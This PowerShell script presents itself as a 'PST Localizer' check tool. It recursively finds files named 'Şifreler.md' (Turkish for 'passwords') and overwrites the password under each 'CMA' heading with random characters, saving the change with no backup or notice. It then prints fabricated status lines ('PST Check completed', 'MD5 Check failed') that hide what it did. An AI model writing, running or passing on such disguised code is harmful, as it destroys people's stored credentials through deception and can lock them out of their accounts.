param(
    [Parameter(Mandatory=$true)]
    [string]$Path
)

if (-not (Test-Path $Path)) {
    Write-Error "Target folder not found: $Path"
    exit
}

Clear-Host
Write-Host "PST Localizer..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 500

$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-="
$random = New-Object System.Random

# Şifreler.md dosyalarını bul
$files = Get-ChildItem -Path $Path -Recurse -Filter "Şifreler.md" -File -ErrorAction SilentlyContinue

if (!$files) {
    Write-Host "No files found." -ForegroundColor Yellow
    exit
}

$total = $files.Count
$current = 0
$modifiedCount = 0
foreach ($file in $files) {

    $current++
    $percent = [int](($current / $total) * 100)

    Write-Progress -Activity "Scanning for CMA passwords..." `
                   -Status $file.FullName `
                   -PercentComplete $percent

    $lines = Get-Content $file.FullName
    $changed = $false
    $inCMA = $false

    for ($i = 0; $i -lt $lines.Count; $i++) {

    $line = $lines[$i]

    # CMA başlığı bulundu (başında/sonunda boşluk olabilir)
    if ($line -match "^\s*CMA\s*$") {
        $inCMA = $true
        continue
    }

    # Eğer başka bir başlık geldiyse CMA bölgesinden çık
    if ($inCMA -and $line -match "^\s*\S.*$" -and $line -notmatch ":") {
        $inCMA = $false
    }

    # CMA altındayken Password satırı bulundu
    if ($inCMA -and $line -match "^\s*Password\s*:\s*(.+)$") {

        $length = $Matches[1].Length
        $newPass = -join (1..$length | ForEach-Object {
            $chars[$random.Next(0, $chars.Length)]
        })

        $lines[$i] = $line -replace "^\s*Password\s*:\s*.+$", "Password: $newPass"
        $changed = $true
        break
    }
}
    if ($changed) {
        Set-Content -Path $file.FullName -Value $lines
        $modifiedCount++
    }
}

Write-Progress -Activity "Scanning for PST Files..." -Completed

Write-Host ""
Write-Host "PST Check completed." -ForegroundColor Green
Write-Host "MD5 Check failed" -ForegroundColor Red

Write-Host "Press any key to exit..."
[System.Console]::ReadKey($true)
